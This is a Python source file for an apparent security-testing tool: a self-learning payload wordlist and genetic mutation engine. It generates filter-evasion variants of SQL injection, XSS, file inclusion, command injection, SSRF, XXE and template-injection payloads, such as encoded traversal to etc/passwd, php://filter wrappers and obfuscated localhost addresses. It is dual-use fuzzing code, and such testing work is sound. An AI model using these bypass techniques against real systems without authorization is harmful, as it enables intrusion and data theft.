#!/usr/bin/env python3
"""
Internal Wordlist Manager v4.0
Self-learning persistent wordlist with evolutionary mutations

Features:
- Persistent storage of learned payloads per vulnerability type
- Integration with EvolutionaryMutationEngine for payload mutations
- Automatic learning from successful attacks
- Combines with external wordlists (PayloadsAllTheThings, FuzzDB, SecLists)
- Fitness-based payload ranking

Author: Security Testing Suite
License: Authorized security research only
"""

import os
import json
import hashlib
import time
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple, Generator, Any
from dataclasses import dataclass, field, asdict
from pathlib import Path
from datetime import datetime
from collections import defaultdict
import logging

logger = logging.getLogger(__name__)


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class LearnedPayload:
    """A payload learned from successful attacks"""
    payload: str
    vuln_type: str
    success_count: int = 1
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    last_success: str = field(default_factory=lambda: datetime.now().isoformat())
    fitness_score: float = 1.0
    generation: int = 0
    parent_payload: Optional[str] = None
    mutation_operator: Optional[str] = None
    source: str = "learned"  # learned, mutated, imported
    metadata: Dict = field(default_factory=dict)

    @property
    def payload_hash(self) -> str:
        return hashlib.md5(self.payload.encode()).hexdigest()[:12]

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> 'LearnedPayload':
        return cls(**data)


@dataclass
class MutationResult:
    """Result of a mutation operation"""
    original: str
    mutated: str
    operator: str
    generation: int


# =============================================================================
# EVOLUTIONARY MUTATION ENGINE (Integrated)
# =============================================================================

class PayloadMutationEngine:
    """
    Evolutionary mutation engine for payload generation.
    Generates targeted mutations based on vulnerability type.
    """

    def __init__(self):
        self.generation = 0
        self.successful_patterns: List[Dict] = []

        # Base mutation operators (applicable to all)
        self.base_operators = {
            'case_swap': self._mutate_case,
            'url_encode': self._mutate_url_encode,
            'double_encode': self._mutate_double_encode,
            'html_entity': self._mutate_html_entity,
            'mixed_encoding': self._mutate_mixed_encoding,
            'unicode': self._mutate_unicode,
            'whitespace': self._mutate_whitespace,
            'null_byte': self._mutate_null_byte,
            'comment_inject': self._mutate_comment,
        }

        # Vulnerability-specific operators
        self.vuln_operators = {
            'sqli': {
                'quote_variation': self._mutate_sqli_quotes,
                'comment_variation': self._mutate_sqli_comments,
                'keyword_case': self._mutate_sqli_keywords,
                'space_bypass': self._mutate_sqli_spaces,
                'concat_variation': self._mutate_sqli_concat,
            },
            'xss': {
                'tag_variation': self._mutate_xss_tags,
                'event_variation': self._mutate_xss_events,
                'encoding_mix': self._mutate_xss_encoding,
                'protocol_variation': self._mutate_xss_protocol,
            },
            'lfi': {
                'path_variation': self._mutate_lfi_path,
                'wrapper_variation': self._mutate_lfi_wrapper,
                'encoding_bypass': self._mutate_lfi_encoding,
            },
            'rce': {
                'separator_variation': self._mutate_rce_separator,
                'encoding_bypass': self._mutate_rce_encoding,
                'wildcard_bypass': self._mutate_rce_wildcard,
            },
            'ssrf': {
                'ip_variation': self._mutate_ssrf_ip,
                'protocol_variation': self._mutate_ssrf_protocol,
                'bypass_variation': self._mutate_ssrf_bypass,
            },
            'xxe': {
                'entity_variation': self._mutate_xxe_entity,
                'encoding_variation': self._mutate_xxe_encoding,
            },
            'ssti': {
                'delimiter_variation': self._mutate_ssti_delimiter,
                'payload_variation': self._mutate_ssti_payload,
            },
            'path_traversal': {
                'sequence_variation': self._mutate_traversal_sequence,
                'encoding_variation': self._mutate_traversal_encoding,
            },
        }

    # -------------------------------------------------------------------------
    # BASE MUTATION OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_case(self, payload: str) -> List[str]:
        """Case variations"""
        if not payload:
            return []
        mutations = [
            payload.upper(),
            payload.lower(),
            payload.swapcase(),
        ]
        # Alternating case
        alternating = ''.join(
            c.upper() if i % 2 else c.lower()
            for i, c in enumerate(payload)
        )
        mutations.append(alternating)
        # Random-ish case (every 3rd char)
        random_case = ''.join(
            c.upper() if i % 3 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        mutations.append(random_case)
        return [m for m in mutations if m != payload]

    def _mutate_url_encode(self, payload: str) -> List[str]:
        """URL encoding variations"""
        mutations = []
        # Full encode
        mutations.append(urllib.parse.quote(payload, safe=''))
        # Full encode preserving slashes
        mutations.append(urllib.parse.quote(payload, safe='/'))
        # Selective encode (special chars only)
        special = ['<', '>', '"', "'", '/', '\\', '&', ';', '|', ' ', '(', ')', '=', '{', '}']
        for char in special:
            if char in payload:
                mutations.append(payload.replace(char, urllib.parse.quote(char)))
        # Hex encoding (lowercase %xx)
        hex_encoded = ''.join(f'%{ord(c):02x}' if not c.isalnum() else c for c in payload)
        mutations.append(hex_encoded)
        # Hex encoding (uppercase %XX)
        hex_upper = ''.join(f'%{ord(c):02X}' if not c.isalnum() else c for c in payload)
        mutations.append(hex_upper)
        # Mixed case hex encoding (%xX alternating)
        mixed_hex = ''.join(
            f'%{ord(c):02x}'.upper() if i % 2 == 0 else f'%{ord(c):02x}'
            if not c.isalnum() else c
            for i, c in enumerate(payload)
        )
        mutations.append(mixed_hex)
        # Full hex encode (ALL characters including alphanum)
        full_hex = ''.join(f'%{ord(c):02x}' for c in payload)
        mutations.append(full_hex)
        return [m for m in mutations if m != payload]

    def _mutate_double_encode(self, payload: str) -> List[str]:
        """Double/triple URL encoding and advanced encoding bypasses"""
        mutations = []
        # Double encode
        encoded = urllib.parse.quote(payload, safe='')
        double = urllib.parse.quote(encoded, safe='')
        mutations.append(double)
        # Triple encode
        triple = urllib.parse.quote(double, safe='')
        mutations.append(triple)
        # Encode just the %
        mutations.append(encoded.replace('%', '%25'))
        # Double encode only special characters (selective double encode)
        special = ['<', '>', '"', "'", '/', '\\', '&', ';', '|', ' ', '(', ')']
        for char in special:
            if char in payload:
                single = urllib.parse.quote(char, safe='')
                double_char = urllib.parse.quote(single, safe='')
                mutations.append(payload.replace(char, double_char))
        # Overlong UTF-8 style encoding (e.g., %c0%af for /)
        overlong_map = {
            '/': '%c0%af',
            '\\': '%c1%9c',
            '.': '%c0%ae',
            '<': '%c0%bc',
            '>': '%c0%be',
        }
        for char, overlong in overlong_map.items():
            if char in payload:
                mutations.append(payload.replace(char, overlong))
        return [m for m in mutations if m != payload]

    def _mutate_html_entity(self, payload: str) -> List[str]:
        """HTML entity encoding variations"""
        mutations = []
        # Named HTML entities
        html_entities = {
            '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;', '&#060;'],
            '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;', '&#062;'],
            '"': ['&quot;', '&#34;', '&#x22;', '&#034;'],
            "'": ['&apos;', '&#39;', '&#x27;', '&#039;'],
            '&': ['&amp;', '&#38;', '&#x26;'],
            '/': ['&#47;', '&#x2f;', '&#x2F;', '&#047;'],
            ' ': ['&#32;', '&#x20;', '&nbsp;'],
            '(': ['&#40;', '&#x28;'],
            ')': ['&#41;', '&#x29;'],
            '=': ['&#61;', '&#x3d;'],
        }
        for char, entities in html_entities.items():
            if char in payload:
                for entity in entities:
                    mutations.append(payload.replace(char, entity))
        # Full decimal entity encoding
        decimal_full = ''.join(f'&#{ord(c)};' for c in payload)
        mutations.append(decimal_full)
        # Full hex entity encoding
        hex_full = ''.join(f'&#x{ord(c):x};' for c in payload)
        mutations.append(hex_full)
        # Zero-padded decimal entities
        padded_full = ''.join(f'&#{ord(c):06d};' for c in payload)
        mutations.append(padded_full)
        return [m for m in mutations if m != payload]

    def _mutate_mixed_encoding(self, payload: str) -> List[str]:
        """Mixed encoding strategies - combine URL, HTML, and Unicode"""
        mutations = []
        # Mix URL encode + HTML entity (alternate chars)
        mixed1 = ''
        for i, c in enumerate(payload):
            if not c.isalnum():
                if i % 2 == 0:
                    mixed1 += urllib.parse.quote(c, safe='')
                else:
                    mixed1 += f'&#{ord(c)};'
            else:
                mixed1 += c
        mutations.append(mixed1)
        # JavaScript Unicode escapes (for XSS contexts)
        js_unicode = ''.join(f'\\u{ord(c):04x}' if not c.isalnum() else c for c in payload)
        mutations.append(js_unicode)
        # Full JavaScript Unicode escapes
        js_unicode_full = ''.join(f'\\u{ord(c):04x}' for c in payload)
        mutations.append(js_unicode_full)
        # JavaScript hex escapes
        js_hex = ''.join(f'\\x{ord(c):02x}' if not c.isalnum() else c for c in payload)
        mutations.append(js_hex)
        # CSS escape sequences (for CSS injection contexts)
        css_escape = ''.join(f'\\{ord(c):x} ' if not c.isalnum() else c for c in payload)
        mutations.append(css_escape)
        # Octal encoding
        octal_enc = ''.join(f'\\{ord(c):03o}' if not c.isalnum() else c for c in payload)
        mutations.append(octal_enc)
        return [m for m in mutations if m != payload]

    def _mutate_unicode(self, payload: str) -> List[str]:
        """Unicode variations"""
        mutations = []
        # Unicode slash variations
        unicode_slashes = ['\u2215', '\u2044', '\uff0f', '\u29f8']
        for slash in unicode_slashes:
            if '/' in payload:
                mutations.append(payload.replace('/', slash))
        # Homoglyphs
        homoglyphs = {
            'a': ['а', 'ɑ', 'α'],  # Cyrillic/Greek
            'e': ['е', 'ε'],
            'o': ['о', 'ο'],
            'c': ['с', 'ϲ'],
            's': ['ѕ'],
        }
        for orig, replacements in homoglyphs.items():
            if orig in payload.lower():
                for repl in replacements:
                    mutations.append(payload.replace(orig, repl))
        return [m for m in mutations if m != payload]

    def _mutate_whitespace(self, payload: str) -> List[str]:
        """Whitespace injection variations"""
        mutations = []
        whitespaces = ['\t', '\n', '\r', '\x0b', '\x0c', '\xa0']
        # Replace spaces with alternatives
        for ws in whitespaces:
            if ' ' in payload:
                mutations.append(payload.replace(' ', ws))
        # Inject at start/end
        for ws in whitespaces[:3]:
            mutations.append(ws + payload)
            mutations.append(payload + ws)
        return [m for m in mutations if m != payload]

    def _mutate_null_byte(self, payload: str) -> List[str]:
        """Null byte injection"""
        mutations = []
        null_variants = ['%00', '\x00', '\0']
        for null in null_variants:
            mutations.append(payload + null)
            if len(payload) > 2:
                mid = len(payload) // 2
                mutations.append(payload[:mid] + null + payload[mid:])
        return [m for m in mutations if m != payload]

    def _mutate_comment(self, payload: str) -> List[str]:
        """Comment injection"""
        mutations = []
        comments = ['/**/', '/*!*/', '/**//**/', '//\n', '#\n']
        for comment in comments:
            if ' ' in payload:
                mutations.append(payload.replace(' ', comment))
        return [m for m in mutations if m != payload]

    # -------------------------------------------------------------------------
    # SQLi SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_sqli_quotes(self, payload: str) -> List[str]:
        """SQLi quote variations"""
        mutations = []
        if "'" in payload:
            mutations.append(payload.replace("'", '"'))
            mutations.append(payload.replace("'", '`'))
            mutations.append(payload.replace("'", "''"))
        if '"' in payload:
            mutations.append(payload.replace('"', "'"))
            mutations.append(payload.replace('"', '""'))
        return mutations

    def _mutate_sqli_comments(self, payload: str) -> List[str]:
        """SQLi comment variations"""
        mutations = []
        comment_variants = ['--', '-- ', '--+', '#', '/*', '/**/', ';--', ';#']
        # Replace existing comments
        for old in ['--', '#', '/**/']:
            if old in payload:
                for new in comment_variants:
                    if new != old:
                        mutations.append(payload.replace(old, new))
        # Add comment at end
        if not any(c in payload for c in comment_variants):
            for comment in comment_variants:
                mutations.append(payload + comment)
        return mutations

    def _mutate_sqli_keywords(self, payload: str) -> List[str]:
        """SQLi keyword case/bypass variations"""
        mutations = []
        keywords = ['SELECT', 'UNION', 'WHERE', 'AND', 'OR', 'FROM', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
        payload_upper = payload.upper()
        for kw in keywords:
            if kw in payload_upper:
                # Mixed case
                mixed = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
                mutations.append(payload.upper().replace(kw, mixed))
                # With inline comment
                with_comment = kw[0] + '/**/' + kw[1:]
                mutations.append(payload.upper().replace(kw, with_comment))
        return mutations

    def _mutate_sqli_spaces(self, payload: str) -> List[str]:
        """SQLi space bypass variations"""
        mutations = []
        space_bypasses = ['/**/', '%09', '%0a', '%0d', '%20', '+', '\t', '/**//**/']
        for bypass in space_bypasses:
            if ' ' in payload:
                mutations.append(payload.replace(' ', bypass))
        return mutations

    def _mutate_sqli_concat(self, payload: str) -> List[str]:
        """SQLi concatenation variations"""
        mutations = []
        # String concatenation bypass
        if "'" in payload:
            # MySQL: 'a'+'b' or 'a''b' or concat('a','b')
            mutations.append(payload.replace("'", "'+'"));
            mutations.append(payload.replace("'", "''"))
        return mutations

    # -------------------------------------------------------------------------
    # XSS SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_xss_tags(self, payload: str) -> List[str]:
        """XSS tag variations"""
        mutations = []
        tag_variants = {
            '<script>': ['<SCRIPT>', '<ScRiPt>', '<script >', '<script/>', '<script\t>', '<scr<script>ipt>'],
            '<img': ['<IMG', '<iMg', '<img/', '<img\t', '<i]mg'],
            '<svg': ['<SVG', '<SvG', '<svg/', '<svg\t'],
            '<body': ['<BODY', '<BoDy', '<body/', '<body\t'],
        }
        for orig, variants in tag_variants.items():
            if orig.lower() in payload.lower():
                for var in variants:
                    mutations.append(payload.lower().replace(orig.lower(), var))
        return mutations

    def _mutate_xss_events(self, payload: str) -> List[str]:
        """XSS event handler variations"""
        mutations = []
        events = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur']
        event_bypasses = ['ONerror', 'oNeRrOr', 'on\terror', 'on/**/error']
        for event in events:
            if event in payload.lower():
                for bypass in event_bypasses:
                    mutations.append(payload.lower().replace(event, bypass.replace('error', event[2:])))
        return mutations

    def _mutate_xss_encoding(self, payload: str) -> List[str]:
        """XSS encoding variations"""
        mutations = []
        # HTML entities
        if '<' in payload:
            mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            mutations.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
            mutations.append(payload.replace('<', '&#x3c;').replace('>', '&#x3e;'))
        # JavaScript encoding
        if 'alert' in payload.lower():
            mutations.append(payload.replace('alert', '\\u0061lert'))
            mutations.append(payload.replace('alert', 'al\\u0065rt'))
        return mutations

    def _mutate_xss_protocol(self, payload: str) -> List[str]:
        """XSS protocol variations"""
        mutations = []
        protocols = {
            'javascript:': ['Javascript:', 'JaVaScRiPt:', 'javascript :', 'java\tscript:', 'javascript\n:'],
            'data:': ['Data:', 'DaTa:', 'data :'],
            'vbscript:': ['Vbscript:', 'VbScRiPt:'],
        }
        for proto, variants in protocols.items():
            if proto.lower() in payload.lower():
                for var in variants:
                    mutations.append(payload.lower().replace(proto.lower(), var))
        return mutations

    # -------------------------------------------------------------------------
    # LFI SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_lfi_path(self, payload: str) -> List[str]:
        """LFI path variations"""
        mutations = []
        # Dot variations
        if '..' in payload:
            mutations.append(payload.replace('..', '....'))
            mutations.append(payload.replace('..', '..;'))
            mutations.append(payload.replace('..', '%2e%2e'))
            mutations.append(payload.replace('..', '%252e%252e'))
        # Slash variations
        if '/' in payload:
            mutations.append(payload.replace('/', '//'))
            mutations.append(payload.replace('/', '\\/'))
            mutations.append(payload.replace('/', '%2f'))
        return mutations

    def _mutate_lfi_wrapper(self, payload: str) -> List[str]:
        """LFI PHP wrapper variations"""
        mutations = []
        if 'php://' in payload.lower():
            mutations.append(payload.replace('php://', 'PHP://'))
            mutations.append(payload.replace('php://', 'pHp://'))
        wrappers = ['php://filter/', 'php://input', 'data://', 'expect://', 'zip://']
        # Add wrappers if not present
        if not any(w in payload.lower() for w in wrappers):
            if payload.startswith('/') or payload.startswith('..'):
                mutations.append(f'php://filter/convert.base64-encode/resource={payload}')
        return mutations

    def _mutate_lfi_encoding(self, payload: str) -> List[str]:
        """LFI encoding bypass"""
        mutations = []
        # URL encode dots and slashes
        mutations.append(payload.replace('.', '%2e').replace('/', '%2f'))
        mutations.append(payload.replace('.', '%252e').replace('/', '%252f'))
        # Null byte (legacy)
        mutations.append(payload + '%00')
        mutations.append(payload + '\x00')
        return mutations

    # -------------------------------------------------------------------------
    # RCE SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_rce_separator(self, payload: str) -> List[str]:
        """RCE command separator variations"""
        mutations = []
        separators = {
            ';': ['|', '||', '&', '&&', '\n', '\r\n', '%0a', '`', '$()'],
            '|': [';', '||', '&&', '\n'],
            '&&': ['||', ';', '&', '|'],
        }
        for sep, variants in separators.items():
            if sep in payload:
                for var in variants:
                    mutations.append(payload.replace(sep, var))
        return mutations

    def _mutate_rce_encoding(self, payload: str) -> List[str]:
        """RCE encoding bypass"""
        mutations = []
        # Hex encoding
        mutations.append(payload.replace(' ', '${IFS}'))
        mutations.append(payload.replace(' ', '$IFS$9'))
        mutations.append(payload.replace(' ', '%09'))
        # Quote bypass
        if 'cat' in payload:
            mutations.append(payload.replace('cat', "c'a't"))
            mutations.append(payload.replace('cat', 'c""at'))
            mutations.append(payload.replace('cat', 'c\\at'))
        return mutations

    def _mutate_rce_wildcard(self, payload: str) -> List[str]:
        """RCE wildcard/glob bypass"""
        mutations = []
        # Use wildcards
        if 'etc' in payload:
            mutations.append(payload.replace('etc', 'e?c'))
            mutations.append(payload.replace('etc', 'e*'))
        if 'passwd' in payload:
            mutations.append(payload.replace('passwd', 'p?sswd'))
            mutations.append(payload.replace('passwd', 'p*'))
        return mutations

    # -------------------------------------------------------------------------
    # SSRF SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_ssrf_ip(self, payload: str) -> List[str]:
        """SSRF IP variations"""
        mutations = []
        localhost_variants = [
            '127.0.0.1', 'localhost', '127.1', '127.0.1', '0.0.0.0',
            '2130706433',  # Decimal
            '0x7f000001',  # Hex
            '017700000001',  # Octal
            '127.0.0.1.nip.io',
            '[::1]', '[::]', '0000::1',
        ]
        for local in ['127.0.0.1', 'localhost']:
            if local in payload.lower():
                for var in localhost_variants:
                    if var.lower() != local:
                        mutations.append(payload.lower().replace(local, var))
        return mutations

    def _mutate_ssrf_protocol(self, payload: str) -> List[str]:
        """SSRF protocol variations"""
        mutations = []
        protocols = ['http://', 'https://', 'gopher://', 'file://', 'dict://', 'ftp://']
        for proto in protocols:
            if proto in payload.lower():
                for new_proto in protocols:
                    if new_proto != proto:
                        mutations.append(payload.lower().replace(proto, new_proto))
        return mutations

    def _mutate_ssrf_bypass(self, payload: str) -> List[str]:
        """SSRF filter bypass variations"""
        mutations = []
        # URL encoding
        if 'http' in payload.lower():
            mutations.append(payload.replace('http', 'hTTp'))
            mutations.append(payload.replace('://', '://\\@'))
            mutations.append(payload.replace('://', '://%00@'))
        # Add credentials
        if '://' in payload and '@' not in payload:
            mutations.append(payload.replace('://', '://user@'))
        return mutations

    # -------------------------------------------------------------------------
    # XXE SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_xxe_entity(self, payload: str) -> List[str]:
        """XXE entity variations"""
        mutations = []
        # Entity encoding
        if '<!ENTITY' in payload.upper():
            mutations.append(payload.replace('<!ENTITY', '<!entity'))
            mutations.append(payload.replace('SYSTEM', 'system'))
        # Parameter entities
        if '%' not in payload and '<!ENTITY' in payload.upper():
            mutations.append(payload.replace('<!ENTITY', '<!ENTITY %'))
        return mutations

    def _mutate_xxe_encoding(self, payload: str) -> List[str]:
        """XXE encoding variations"""
        mutations = []
        # UTF-16 header
        if '<?xml' in payload.lower():
            mutations.append(payload.replace('<?xml', '<?xml encoding="UTF-16"'))
            mutations.append(payload.replace('<?xml', '<?xml encoding="UTF-7"'))
        return mutations

    # -------------------------------------------------------------------------
    # SSTI SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_ssti_delimiter(self, payload: str) -> List[str]:
        """SSTI delimiter variations"""
        mutations = []
        delimiters = {
            '{{': ['{%', '${', '#{', '<%', '[%', '[['],
            '}}': ['%}', '}', '%>', '%]', ']]'],
        }
        for orig, variants in delimiters.items():
            if orig in payload:
                for var in variants:
                    mutations.append(payload.replace(orig, var))
        return mutations

    def _mutate_ssti_payload(self, payload: str) -> List[str]:
        """SSTI payload variations"""
        mutations = []
        # Jinja2 specific
        if '{{' in payload:
            if 'config' in payload:
                mutations.append(payload.replace('config', 'self.__class__'))
                mutations.append(payload.replace('config', 'request'))
        return mutations

    # -------------------------------------------------------------------------
    # PATH TRAVERSAL SPECIFIC OPERATORS
    # -------------------------------------------------------------------------

    def _mutate_traversal_sequence(self, payload: str) -> List[str]:
        """Path traversal sequence variations"""
        mutations = []
        sequences = ['../', '..\\', '..../', '....//', '..;/', '..%00/', '.%2e/']
        for seq in ['../', '..\\']:
            if seq in payload:
                for new_seq in sequences:
                    if new_seq != seq:
                        mutations.append(payload.replace(seq, new_seq))
        return mutations

    def _mutate_traversal_encoding(self, payload: str) -> List[str]:
        """Path traversal encoding variations"""
        mutations = []
        encodings = {
            '../': ['%2e%2e/', '%2e%2e%2f', '..%2f', '%252e%252e%252f', '..%252f'],
            '..\\': ['%2e%2e\\', '%2e%2e%5c', '..%5c', '%252e%252e%255c'],
        }
        for orig, variants in encodings.items():
            if orig in payload:
                for var in variants:
                    mutations.append(payload.replace(orig, var))
        return mutations

    # -------------------------------------------------------------------------
    # MAIN MUTATION METHODS
    # -------------------------------------------------------------------------

    def mutate(self, payload: str, vuln_type: str = None,
               max_mutations: int = 50) -> List[MutationResult]:
        """
        Generate mutations for a payload.

        Args:
            payload: Base payload to mutate
            vuln_type: Vulnerability type for targeted mutations
            max_mutations: Maximum number of mutations

        Returns:
            List of MutationResult objects
        """
        self.generation += 1
        all_mutations = []
        seen = {payload}  # Avoid duplicates

        # Apply base operators
        for name, operator in self.base_operators.items():
            try:
                results = operator(payload)
                for mutated in results:
                    if mutated and mutated not in seen:
                        seen.add(mutated)
                        all_mutations.append(MutationResult(
                            original=payload,
                            mutated=mutated,
                            operator=name,
                            generation=self.generation
                        ))
            except Exception as e:
                logger.debug(f"Mutation operator {name} failed: {e}")

        # Apply vulnerability-specific operators
        if vuln_type and vuln_type in self.vuln_operators:
            for name, operator in self.vuln_operators[vuln_type].items():
                try:
                    results = operator(payload)
                    for mutated in results:
                        if mutated and mutated not in seen:
                            seen.add(mutated)
                            all_mutations.append(MutationResult(
                                original=payload,
                                mutated=mutated,
                                operator=f"{vuln_type}:{name}",
                                generation=self.generation
                            ))
                except Exception as e:
                    logger.debug(f"Vuln operator {vuln_type}:{name} failed: {e}")

        # Limit results
        if len(all_mutations) > max_mutations:
            all_mutations = all_mutations[:max_mutations]

        return all_mutations

    def crossover(self, payload1: str, payload2: str) -> str:
        """Crossover two payloads (genetic algorithm)"""
        if not payload1 or not payload2:
            return payload1 or payload2

        min_len = min(len(payload1), len(payload2))
        if min_len < 2:
            return payload1

        # Single-point crossover
        point = min_len // 2
        return payload1[:point] + payload2[point:]

    def evolve_population(self, payloads: List[str], fitness_scores: Dict[str, float],
                         vuln_type: str = None, max_offspring: int = 100) -> List[str]:
        """
        Evolve a population of payloads based on fitness.

        Args:
            payloads: Current population
            fitness_scores: Dict of {payload: score}
            vuln_type: Target vulnerability type
            max_offspring: Max new payloads to generate

        Returns:
            New population of payloads
        """
        offspring = []

        # Sort by fitness
        sorted_payloads = sorted(
            [(p, fitness_scores.get(p, 0.0)) for p in payloads],
            key=lambda x: x[1],
            reverse=True
        )

        # Top performers (elites)
        elites = [p for p, _ in sorted_payloads[:5]]

        # Mutate elites
        for elite in elites:
            mutations = self.mutate(elite, vuln_type, max_mutations=10)
            for m in mutations:
                offspring.append(m.mutated)

        # Crossover between elites
        for i, p1 in enumerate(elites):
            for p2 in elites[i+1:]:
                crossed = self.crossover(p1, p2)
                if crossed:
                    offspring.append(crossed)

        # Limit and deduplicate
        seen = set(payloads)
        unique_offspring = []
        for p in offspring:
            if p not in seen:
                seen.add(p)
                unique_offspring.append(p)
            if len(unique_offspring) >= max_offspring:
                break

        return unique_offspring


# =============================================================================
# INTERNAL WORDLIST MANAGER
# =============================================================================

class InternalWordlistManager:
    """
    Manages persistent internal wordlists that grow with usage.
    Stores learned payloads organized by vulnerability type.
    """

    DEFAULT_STORAGE_PATH = Path.home() / '.security-suite' / 'internal_wordlists'

    def __init__(self, storage_path: Path = None):
        """
        Initialize internal wordlist manager.

        Args:
            storage_path: Directory for storing wordlists
        """
        self.storage_path = Path(storage_path) if storage_path else self.DEFAULT_STORAGE_PATH
        self.storage_path.mkdir(parents=True, exist_ok=True)

        self.mutation_engine = PayloadMutationEngine()
        self.payloads: Dict[str, Dict[str, LearnedPayload]] = defaultdict(dict)
        self.fitness_history: Dict[str, Dict[str, List[float]]] = defaultdict(lambda: defaultdict(list))

        # Load existing wordlists
        self._load_all_wordlists()

        logger.info(f"InternalWordlistManager initialized at {self.storage_path}")

    def _get_wordlist_path(self, vuln_type: str) -> Path:
        """Get path for a vulnerability type's wordlist"""
        return self.storage_path / f"{vuln_type}.json"

    def _load_all_wordlists(self):
        """Load all existing wordlists from storage"""
        for filepath in self.storage_path.glob("*.json"):
            vuln_type = filepath.stem
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for payload_hash, payload_data in data.get('payloads', {}).items():
                        self.payloads[vuln_type][payload_hash] = LearnedPayload.from_dict(payload_data)
                    logger.debug(f"Loaded {len(self.payloads[vuln_type])} payloads for {vuln_type}")
            except Exception as e:
                logger.warning(f"Failed to load wordlist {filepath}: {e}")

    def _save_wordlist(self, vuln_type: str):
        """Save a vulnerability type's wordlist to storage"""
        filepath = self._get_wordlist_path(vuln_type)
        try:
            data = {
                'vuln_type': vuln_type,
                'updated': datetime.now().isoformat(),
                'total_payloads': len(self.payloads[vuln_type]),
                'payloads': {
                    ph: lp.to_dict()
                    for ph, lp in self.payloads[vuln_type].items()
                }
            }
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            logger.debug(f"Saved {len(self.payloads[vuln_type])} payloads for {vuln_type}")
        except Exception as e:
            logger.error(f"Failed to save wordlist {filepath}: {e}")

    def add_payload(self, payload: str, vuln_type: str,
                   fitness_score: float = 1.0,
                   source: str = "learned",
                   parent_payload: str = None,
                   mutation_operator: str = None,
                   metadata: Dict = None) -> bool:
        """
        Add a payload to the internal wordlist.

        Args:
            payload: The payload string
            vuln_type: Vulnerability type
            fitness_score: Initial fitness score (0.0-1.0)
            source: Origin of payload (learned, mutated, imported)
            parent_payload: Parent payload if mutated
            mutation_operator: Mutation operator used
            metadata: Additional metadata

        Returns:
            True if added (new), False if updated (existing)
        """
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:12]

        if payload_hash in self.payloads[vuln_type]:
            # Update existing
            existing = self.payloads[vuln_type][payload_hash]
            existing.success_count += 1
            existing.last_success = datetime.now().isoformat()
            existing.fitness_score = max(existing.fitness_score, fitness_score)
            self._save_wordlist(vuln_type)
            return False
        else:
            # Add new
            learned = LearnedPayload(
                payload=payload,
                vuln_type=vuln_type,
                fitness_score=fitness_score,
                generation=self.mutation_engine.generation,
                parent_payload=parent_payload,
                mutation_operator=mutation_operator,
                source=source,
                metadata=metadata or {}
            )
            self.payloads[vuln_type][payload_hash] = learned
            self._save_wordlist(vuln_type)
            return True

    def learn_from_success(self, payload: str, vuln_type: str,
                          confidence: float, technique: str = None,
                          generate_mutations: bool = True,
                          max_mutations: int = 20) -> int:
        """
        Learn from a successful attack and optionally generate mutations.

        Args:
            payload: Successful payload
            vuln_type: Vulnerability type
            confidence: Detection confidence (0.0-1.0)
            technique: Detection technique used
            generate_mutations: Whether to generate mutations
            max_mutations: Max mutations to generate

        Returns:
            Number of new payloads added
        """
        added = 0

        # Add the successful payload
        is_new = self.add_payload(
            payload=payload,
            vuln_type=vuln_type,
            fitness_score=confidence,
            source="learned",
            metadata={'technique': technique} if technique else {}
        )
        if is_new:
            added += 1

        # Update fitness history
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:12]
        self.fitness_history[vuln_type][payload_hash].append(confidence)

        # Generate mutations from successful payload
        if generate_mutations:
            mutations = self.mutation_engine.mutate(
                payload=payload,
                vuln_type=vuln_type,
                max_mutations=max_mutations
            )

            for mutation in mutations:
                # Assign initial fitness based on parent + operator reputation
                initial_fitness = confidence * 0.7  # Mutations start slightly lower

                is_new = self.add_payload(
                    payload=mutation.mutated,
                    vuln_type=vuln_type,
                    fitness_score=initial_fitness,
                    source="mutated",
                    parent_payload=payload,
                    mutation_operator=mutation.operator
                )
                if is_new:
                    added += 1

        logger.info(f"Learned from success: {added} new payloads for {vuln_type}")
        return added

    def get_payloads(self, vuln_type: str,
                    min_fitness: float = 0.0,
                    limit: int = None,
                    sort_by_fitness: bool = True) -> List[str]:
        """
        Get payloads for a vulnerability type.

        Args:
            vuln_type: Vulnerability type
            min_fitness: Minimum fitness score
            limit: Maximum payloads to return
            sort_by_fitness: Sort by fitness descending

        Returns:
            List of payload strings
        """
        if vuln_type not in self.payloads:
            return []

        # Filter by fitness
        filtered = [
            lp for lp in self.payloads[vuln_type].values()
            if lp.fitness_score >= min_fitness
        ]

        # Sort
        if sort_by_fitness:
            filtered.sort(key=lambda x: (x.fitness_score, x.success_count), reverse=True)

        # Extract payloads
        result = [lp.payload for lp in filtered]

        # Limit
        if limit:
            result = result[:limit]

        return result

    def get_payloads_with_metadata(self, vuln_type: str) -> List[LearnedPayload]:
        """Get payloads with full metadata"""
        return list(self.payloads.get(vuln_type, {}).values())

    def get_statistics(self) -> Dict:
        """Get statistics about internal wordlists"""
        stats = {
            'total_payloads': sum(len(p) for p in self.payloads.values()),
            'by_vuln_type': {},
            'storage_path': str(self.storage_path),
            'mutation_generation': self.mutation_engine.generation,
        }

        for vuln_type, payloads in self.payloads.items():
            learned = sum(1 for p in payloads.values() if p.source == 'learned')
            mutated = sum(1 for p in payloads.values() if p.source == 'mutated')
            avg_fitness = sum(p.fitness_score for p in payloads.values()) / len(payloads) if payloads else 0

